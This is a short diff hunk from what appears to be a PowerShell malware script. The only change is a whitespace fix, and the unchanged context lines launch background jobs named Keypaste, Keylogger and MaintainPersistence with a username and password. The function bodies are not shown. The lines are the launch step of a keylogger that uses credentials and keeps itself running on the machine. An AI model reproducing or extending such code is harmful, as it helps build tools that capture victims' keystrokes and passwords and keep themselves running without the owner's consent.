@@ -375,7 +375,7 @@ $functions =  {
 		}
 	}
 }
-	
+
 start-job -InitializationScript $functions -scriptblock {Keypaste $args[0] $args[1]} -ArgumentList @($username,$password)
 start-job -InitializationScript $functions -scriptblock {Keylogger}
 start-job -InitializationScript $functions -scriptblock {MaintainPersistence $args[0] $args[1]} -ArgumentList @($username,$password)
